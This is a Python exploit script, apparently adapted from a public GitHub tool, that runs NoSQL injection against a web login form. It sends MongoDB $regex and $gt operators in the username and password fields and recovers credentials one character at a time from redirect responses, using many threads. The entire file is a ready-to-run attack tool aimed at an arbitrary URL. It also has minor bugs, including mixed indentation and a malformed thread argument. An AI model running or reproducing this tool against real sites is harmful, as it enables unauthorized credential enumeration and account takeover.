# Exploit Title: Nosql injection username/password enumeration
# EDIT from https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
# Edit by HaoNH

#!/usr/bin/python
import string
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import argparse
import sys
import Queue
import threading
from colorama import Fore
from time import sleep


parser = argparse.ArgumentParser()
parser.add_argument("-u", action='store', metavar="URL", help="Form submission url. Eg: http://example.com/index.php")
parser.add_argument("-up", action='store', metavar="parameter", help="Parameter name of the username. Eg: username, user")
parser.add_argument("-pp", action='store', metavar="parameter", help="Parameter name of the password. Eg: password, pass")
parser.add_argument("-op", action='store', metavar="parameters", help="Other paramters with the values. Separate each parameter with a comma(,). Eg: login:Login, submit:Submit")
parser.add_argument("-ep", action='store', metavar="parameter", help="Parameter that need to enumerate. Eg: username, password")
parser.add_argument("-m", action='store', metavar="Method", help="Method of the form. Eg: GET/POST")
args = parser.parse_args()


#Global variable
characters = string.printable
for ch in string.printable:
	
	if ch in "$^&*|.+\?":
		characters = characters.replace(ch, '')
loop = True
finalout = ""
count = 0
queue = Queue.Queue()
max_thread = 100

if len(sys.argv) == 1:
	print(parser.print_help(sys.stderr))
	print(Fore.YELLOW + "\nExample: python " + sys.argv[0] + " -u http://example.com/index.php -up username -pp password -ep username -op login:login,submit:submit -m POST")
	exit(0)
if args.u:
	url = args.u
else:
	print(Fore.RED + "Error: please enter URL with -u. ")
	exit(0)

if args.up:
	userpara = args.up
else:
	print(Fore.RED + "Error: please enter User Parameter with -up.")
	exit(0)

if args.pp:
	passpara = args.pp
else:
	print("Error: Fore.RED + please enter Password Parameter with -pp.")
	exit(0)

if args.ep:
	if args.ep == args.up:
		para1 = userpara
		para2 = passpara
	elif args.ep == args.pp:
		para1 = passpara
		para2 = userpara
	else:
		print(Fore.RED + "Error: please enter the valid parameter that need to enumarate")
		exit(0)
else:
	print(Fore.RED + "Error: please enter the Parameter that need to enumerate with -ep.")
	exit(0)

if args.op:
	otherpara = "," + args.op
else:
	otherpara = ""

if args.m is None:
	print(Fore.RED + "Warning: No method given. Using POST as the method. (You can give the method with -m)")

def put_queue(t):
	#Check if threads < max start threads else put to queue
	global queue
	if threading.active_count() > max_thread:
            if t not in queue.queue:
                queue.put(t)
        else:
            try:
				t.start()
				threads.append(t)
            except:
                return


def pop_queue():
	#Get threads in queue and start
	if threading.active_count() < (max_thread):
		if not queue.empty():
			t = queue.get_nowait()
			try:
				t.start()
				threads.append(t)
			except:
				return


def method(url, para):
	session = requests.Session()
	retry = Retry(connect=5, backoff_factor=0.5)
	adapter = HTTPAdapter(max_retries=retry)
	session.mount('http://', adapter)
	session.mount('https://', adapter)
	if args.m:
		if args.m[0] == "p" or args.m[0] == "P":
			return session.post(url, data=para, allow_redirects=False)
		elif args.m[0] == "g" or args.m[0] == "G":
			return session.get(url, params=para, allow_redirects=False)
		else:
			print(Fore.RED + "Error: Invalid method")
			exit(0)
	else:
		return session.post(url, data=para, allow_redirects=False)

def Loopfindalldata(userpass):
	loop = True
	global finalout
	global count
	finded = False
	payload =''
	characters = string.printable
	for ch in string.printable:
		if ch in "$^&*|.+\?":
			characters = characters.replace(ch, '')
	for char in characters[:-6]:
		if char == '':
			continue
		payload = userpass + char
		para = {para1 + '[$regex]' : "^" + payload + ".*", para2 + '[$gt]' : '' + otherpara}
		r = method(url, para)

		if r.status_code == 302:
			finded = True
			print(Fore.YELLOW + "Pattern found: " + payload)
			t = threading.Thread(target=Loopfindalldata, args = (payload,))
			put_queue(t)
	if not finded:
		print(Fore.GREEN + para1 + " found: "  + userpass)
		finalout +=  userpass + "\n"
		count += 1;
	pop_queue()


threads =[]
for firstChar in characters:
	para = {para1 + '[$regex]' : "^" + firstChar + ".*", para2 + '[$gt]' : '' + otherpara}
	r = method(url, para)
	#Status code if login true.
	if r.status_code != 302:
			continue;

	loop = True
	print(Fore.GREEN + "Pattern found that starts with '" + firstChar + "'")
	userpass = firstChar
	t = threading.Thread(target=Loopfindalldata, args = (firstChar))
	put_queue(t)

for i in threads:
	i.join()

if finalout != "":
	print("\n" + str(count) + " " + para1 + "(s) found:")
	print(Fore.RED + finalout)
else:
	print(Fore.RED + "No " + para1 + " found")

	

